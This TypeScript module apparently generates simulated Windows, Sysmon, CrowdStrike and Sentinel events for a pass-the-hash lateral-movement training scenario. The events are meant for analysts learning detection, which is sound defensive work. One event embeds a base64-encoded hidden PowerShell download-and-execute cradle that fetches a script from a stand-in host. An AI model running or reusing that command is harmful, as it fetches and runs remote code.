/**
 * Events-only half of the ./lateralMovementPth.ts scenario pack.
 *
 * The dashboard's live feed runs in the browser (attackStories.ts), so what it
 * imports ships in a public /_next/static chunk. The answer key (questions,
 * answers, explanations, IOCs, killchain, narrative) stays in the builder in
 * ./lateralMovementPth.ts, which composes this module on the server. Keep anything
 * answer-bearing out of this file: every visitor can read it.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { winLogon, winSpecialPrivileges, winShareAccess, winServiceInstall, winProcessCreate } from "@/lib/sim/emitters/windowsSecurity";
import { sysmonProcess, sysmonNetwork, sysmonProcessAccess } from "@/lib/sim/emitters/sysmon";
import { csAlert } from "@/lib/sim/emitters/crowdstrike";
import { sentinelUeba } from "@/lib/sim/emitters/sentinel";

/** Telemetry half of the lateralMovementPth scenario: the events and the story title, no answer key. */
export function lateralMovementPthScenarioEvents() {
  const title = "Lateral Movement — Pass-the-Hash to the File Server, Second Hop to the DC";
  const B = new Date("2026-08-27T02:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  // One incident — the whole chain is a single lateral-movement case.
  const INCIDENT = "inc:lm:1";

  // The foothold workstation (out of scope — where the hash was dumped), the
  // file server the operator moves to, and the DC the second hop reaches.
  const foothold = { hostname: "FIN-WS-11", fqdn: "FIN-WS-11.nexacorp.com", ip: "10.20.6.41" };
  const fileSrv  = { hostname: "SRV-FILE-03", fqdn: "SRV-FILE-03.nexacorp.com", ip: "10.20.7.28" };
  const dc       = { hostname: "DC-NEXA-01", fqdn: "DC-NEXA-01.nexacorp.com", ip: "10.20.5.10" };

  // The abused account: an infrastructure admin whose cached credentials sat in
  // LSASS on FIN-WS-11 after she remoted in to fix it — local-admin on servers,
  // exactly the account an operator wants.
  const admin = { sam: "s.kessler", email: "s.kessler@nexacorp.com", title: "Infrastructure Administrator" };
  const adminSid = "S-1-5-21-3421479547-3897544621-1789562108-2205";

  // The benign control: an ordinary finance user reaching the same share the
  // legitimate way — Kerberos, from her own workstation, in business hours.
  const benign = { sam: "m.rossi", email: "m.rossi@nexacorp.com" };
  const benignSid = "S-1-5-21-3421479547-3897544621-1789562108-3318";
  const benignWs = { hostname: "FIN-WS-22", ip: "10.20.6.52" };

  // The remotely-installed service and its payload binary.
  const svcBinaryHash = makeSha256("lateralmovement_pth_svcupd64_service_binary_2026");
  const sensorId = "b83f2c1e7d9a4056b1d4e8720af3c915";

  const cxNexa = "nexacorp" as const;

  const events: TelemetryEvent[] = [
    // 0. BENIGN CONTROL — the legitimate way to reach SRV-FILE-03 (Kerberos, own WS, business hours).
    {
      ...winLogon({
        companyId: cxNexa, id: "evt_lm_00_benign_logon", ts: "2026-08-26T13:12:04.000Z", host: fileSrv.hostname, fqdn: fileSrv.fqdn,
        targetUser: benign.sam, targetSid: benignSid, srcIp: benignWs.ip, logonType: 3, authPackage: "Kerberos", logonProcess: "Kerberos",
        logonId: "0x5A11C02", srcPort: "50142", workstation: benignWs.hostname, recordId: "5540912", severity: "informational",
        description:
          "A 4624 network logon for m.rossi on SRV-FILE-03 at 13:12 the previous afternoon, LogonType 3 over Kerberos, from her own workstation FIN-WS-22.",
      }),
      fp_explanation:
        "Legitimate Type-3 network logon to the file server: Kerberos (the in-domain default), from the user's OWN workstation FIN-WS-22, at 13:12 on a business day. Same 4624 / LogonType 3 as the attack — the difference is the authentication package, the source host, and the hour.",
    },

    // 1. THE SOURCE OF THE HASH — LSASS access on the foothold (Sysmon 10).
    sysmonProcessAccess({
      companyId: cxNexa, id: "evt_lm_01_lsass_access", ts: T(0), host: foothold.hostname, user: admin.email, srcIp: foothold.ip,
      sourceImage: "C:\\Windows\\Temp\\svchost.exe", sourcePid: 6624, targetPid: 712, grantedAccess: "0x1410",
      callTrace: "C:\\Windows\\SYSTEM32\\ntdll.dll+9d234|C:\\Windows\\System32\\KERNELBASE.dll+2a1ee|UNKNOWN(0000000abc120000)",
      mitre: "T1003.001", tactic: "Credential Access", severity: "high", incidentId: INCIDENT,
      description:
        "On the foothold host FIN-WS-11 a process running from C:\\Windows\\Temp opened lsass.exe with GrantedAccess 0x1410 at 02:00 — the read/query rights a credential dumper uses to lift hashes from memory.",
    }),

    // 2. THE PASS-THE-HASH LANDING — an ordinary-looking 4624, but NTLM, off-hours.
    winLogon({
      companyId: cxNexa, id: "evt_lm_02_pth_logon", ts: T(4 * MIN), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
      targetUser: admin.sam, targetSid: adminSid, srcIp: foothold.ip, logonType: 3, authPackage: "NTLM", logonProcess: "NtLmSsp ",
      lmPackage: "NTLM V2", keyLength: "0", logonId: "0x6C41F70", srcPort: "49277", workstation: foothold.hostname, recordId: "5551338",
      mitre: "T1550.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
      description:
        "A 4624 network logon for s.kessler arrived on SRV-FILE-03 at 02:04, LogonType 3 over NTLM, from FIN-WS-11 (10.20.6.41) — a user workstation reaching a file server as an infrastructure admin, at night.",
    }),

    // 3. 4672 — the logon carried admin privileges.
    winSpecialPrivileges({
      companyId: cxNexa, id: "evt_lm_03_special_privs", ts: T(4 * MIN + 6 * SEC), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
      targetUser: admin.sam, targetSid: adminSid, srcIp: foothold.ip, logonId: "0x6C41F70", recordId: "5551339",
      privilegeList: "SeSecurityPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeTcbPrivilege",
      mitre: "T1078", tactic: "Privilege Escalation", severity: "medium", incidentId: INCIDENT,
      description:
        "A 4672 on SRV-FILE-03 assigned SeDebugPrivilege, SeTcbPrivilege and SeBackupPrivilege to the s.kessler logon session — this NTLM network logon is running with local-administrator rights.",
    }),

    // 4. 5140 — ADMIN$ opened (the PsExec SMB channel).
    winShareAccess({
      companyId: cxNexa, id: "evt_lm_04_admin_share", ts: T(4 * MIN + 22 * SEC), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
      targetUser: admin.sam, targetSid: adminSid, srcIp: foothold.ip, shareName: "\\\\*\\ADMIN$", shareLocalPath: "\\??\\C:\\Windows",
      subjectLogonId: "0x6C41F70", recordId: "5551361", mitre: "T1021.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
      description:
        "SRV-FILE-03 logged a 5140 connection to the ADMIN$ administrative share under the s.kessler session from 10.20.6.41 — the hidden share used to stage and launch remote code, not a normal file access.",
    }),

    // 5. 7045 — a service is installed remotely.
    winServiceInstall({
      companyId: cxNexa, id: "evt_lm_05_service_install", ts: T(5 * MIN), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
      targetUser: admin.sam, userEmail: null, installerSid: adminSid, srcIp: foothold.ip, serviceName: "WinSvcUpdate", imagePath: "C:\\Windows\\svcupd64.exe",
      accountName: "LocalSystem", serviceType: "user mode service", startType: "auto start", recordId: "884012",
      mitre: "T1569.002", tactic: "Execution", severity: "high", incidentId: INCIDENT,
      description:
        "A 7045 on SRV-FILE-03 recorded a new auto-start service, WinSvcUpdate, whose binary C:\\Windows\\svcupd64.exe runs as LocalSystem — a service created over the ADMIN$ session moments after the NTLM logon.",
    }),

    // 6. Sysmon 1 — the service binary executes as SYSTEM.
    sysmonProcess({
      companyId: cxNexa, id: "evt_lm_06_service_exec", ts: T(5 * MIN + 9 * SEC), host: fileSrv.hostname, user: admin.email, srcIp: fileSrv.ip,
      processName: "svcupd64.exe", processPath: "C:\\Windows\\svcupd64.exe", cmdline: "C:\\Windows\\svcupd64.exe",
      parentName: "services.exe", parentPath: "C:\\Windows\\System32\\services.exe", pid: 8104, parentPid: 720,
      sha256: svcBinaryHash, signed: false, integrity: "System", originalFileName: "svcupd64.exe", runAsUser: "NT AUTHORITY\\SYSTEM",
      mitre: "T1569.002", tactic: "Execution", severity: "high", incidentId: INCIDENT,
      description:
        "Sysmon recorded services.exe on SRV-FILE-03 spawning C:\\Windows\\svcupd64.exe as LocalSystem — the installed service starting, an unsigned binary launched by the Service Control Manager.",
    }),

    // 7. 4688 — the payload spawns an encoded PowerShell child.
    winProcessCreate({
      companyId: cxNexa, id: "evt_lm_07_payload_powershell", ts: T(5 * MIN + 12 * SEC), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
      targetUser: admin.sam, srcIp: fileSrv.ip, processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQB3AGkAbgB1AHAAZABhAHQAZQAuAG4AZQB0AC8AYwAuAHAAcwAxACcAKQA=", parentPath: "C:\\Windows\\svcupd64.exe", pid: 8260, subjectUser: "SRV-FILE-03$", subjectSid: "S-1-5-18",
      runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", tokenElevation: "%%1936", recordId: "5551402",
      mitre: "T1059.001", tactic: "Execution", severity: "high", incidentId: INCIDENT,
      description:
        "A 4688 on SRV-FILE-03 shows svcupd64.exe spawning an encoded, hidden-window PowerShell as SYSTEM — the remotely-installed service acting as a loader.",
    }),

    // 7b. Sysmon 3 — the encoded command's download (DownloadString from cdn-winupdate.net).
    sysmonNetwork({
      companyId: cxNexa, id: "evt_lm_07b_payload_download", ts: T(5 * MIN + 14 * SEC), host: fileSrv.hostname, user: null, srcIp: fileSrv.ip,
      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pid: 8260, remoteIp: "185.174.137.26", remotePort: 80, remoteHost: "cdn-winupdate.net",
      transport: "tcp", mitre: "T1105", tactic: "Command and Control", severity: "high", incidentId: INCIDENT,
      description:
        "Sysmon recorded the SYSTEM PowerShell on SRV-FILE-03 opening an outbound TCP/80 connection to cdn-winupdate.net (185.174.137.26) two seconds after it started — a server fetching a script from the internet, not a Microsoft update host.",
    }),

    // 8. Sysmon 3 — the payload reaches toward the DC over SMB (445).
    sysmonNetwork({
      companyId: cxNexa, id: "evt_lm_08_smb_to_dc", ts: T(6 * MIN), host: fileSrv.hostname, user: null, srcIp: fileSrv.ip,
      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pid: 8260, remoteIp: dc.ip, remotePort: 445, remoteHost: dc.fqdn,
      transport: "tcp", mitre: "T1021.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
      description:
        "Sysmon recorded powershell.exe on SRV-FILE-03 opening an outbound TCP/445 (SMB) connection to DC-NEXA-01 (10.20.5.10) — the operator pivoting from the file server toward a Domain Controller.",
    }),

    // 9. CrowdStrike Falcon detection — the pass-the-hash pattern (edr_scope hybrid).
    {
      ...csAlert({
        companyId: cxNexa, id: "evt_lm_09_edr_detection", ts: T(6 * MIN + 40 * SEC), host: fileSrv.hostname, user: admin.email, srcIp: fileSrv.ip,
        threatName: "PassTheHashRemoteServiceExecution", mitre: "T1550.002", tactic: "Lateral Movement",
        technique: "Use Alternate Authentication Material: Pass the Hash", processTree: "services.exe > svcupd64.exe > powershell.exe",
        severity: "critical", action: "detected", incidentId: INCIDENT,
        description:
          "Falcon raised a Critical detection on SRV-FILE-03: an NTLM network logon for a privileged account from a workstation, followed by a remotely-installed service and an encoded PowerShell opening SMB to DC-NEXA-01 — a pass-the-hash lateral-movement pattern.",
      }),
      edr_scope: "hybrid",
    },

    // 10. THE SECOND HOP — a 4624 on the DC, same hash, from SRV-FILE-03.
    winLogon({
      companyId: cxNexa, id: "evt_lm_10_dc_logon", ts: T(8 * MIN), host: dc.hostname, fqdn: dc.fqdn,
      targetUser: admin.sam, targetSid: adminSid, srcIp: fileSrv.ip, logonType: 3, authPackage: "NTLM", logonProcess: "NtLmSsp ",
      lmPackage: "NTLM V2", keyLength: "0", logonId: "0x8B03D19", srcPort: "52140", workstation: fileSrv.hostname, recordId: "9920551",
      mitre: "T1550.002", tactic: "Lateral Movement", severity: "critical", incidentId: INCIDENT,
      description:
        "A 4624 network logon for s.kessler landed on DC-NEXA-01 at 02:08, LogonType 3 over NTLM, this time sourced from SRV-FILE-03 (10.20.7.28) — the same replayed hash reaching a Domain Controller one hop on.",
    }),

    // 11. Sentinel correlation (Defender for Identity) — the multi-hop chain.
    sentinelUeba({
      companyId: cxNexa, id: "evt_lm_11_sentinel_correlation", ts: T(9 * MIN), user: admin.email, userSam: admin.sam, srcIp: foothold.ip,
      alertName: "LateralMovement_PassTheHash_MultiHop", alertSeverity: "High", ruleId: "SEN-IDENT-0342", severity: "critical", eventType: "ueba_anomaly",
      fullName: "Sofia Kessler", department: "IT Infrastructure", title: admin.title,
      groups: ["Domain Users", "Server Operators", "Backup Operators"],
      mitre: "T1550.002", threatTechnique: "Use Alternate Authentication Material: Pass the Hash", threatTactic: "Lateral Movement", incidentId: INCIDENT,
      extendedProperties: {
        "DefenderForIdentity Detection": "Suspected identity theft (pass-the-hash)",
        "Authentication Package": "NTLM",
        "Hosts In Path": ["FIN-WS-11", "SRV-FILE-03", "DC-NEXA-01"],
        "Window Start": T(4 * MIN),
        "Window End": T(8 * MIN),
        "Usual Logon Hours": "08:00-19:00",
        "Usual Auth Protocol": "Kerberos",
        "Source Addresses In Window": [foothold.ip, fileSrv.ip],
      },
      description:
        "Sentinel raised a correlation alert, enriched by Defender for Identity, for s.kessler: NTLM authentications traversing FIN-WS-11 -> SRV-FILE-03 -> DC-NEXA-01 in nine minutes off-hours, with the account's normal logon pattern attached for comparison.",
    }),
  ];

  return { title, events, B, T, MIN, SEC, INCIDENT, foothold, fileSrv, dc, admin, adminSid, benign, benignSid, benignWs, svcBinaryHash, sensorId, cxNexa };
}
